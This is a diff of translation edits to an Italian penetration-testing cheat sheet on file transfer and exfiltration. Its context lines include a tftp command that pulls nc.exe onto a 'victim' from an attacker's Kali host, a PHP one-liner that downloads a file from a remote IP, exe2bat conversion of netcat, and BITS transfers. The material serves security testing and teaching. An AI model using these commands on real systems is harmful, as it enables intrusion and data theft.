@@ -42,7 +42,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Caricamento file
+### Carica file
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer che stampa GET e POST (anche intestazioni)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -102,7 +102,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### Server FTP (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -248,13 +248,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **victima**, connettersi al server Kali:
+In **victima**, connettiti al server Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Scarica un file con un PHP oneliner:
+Scarica un file con un oneliner PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -302,7 +302,7 @@ Il programma `debug.exe` non solo consente l'ispezione dei file binari, ma ha an
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Quindi copia e incolla il testo nella finestra di comando di Windows e verrà creato un file chiamato nc.exe.
+Poi copia e incolla il testo nella shell di Windows e verrà creato un file chiamato nc.exe.
 
 ## DNS
 
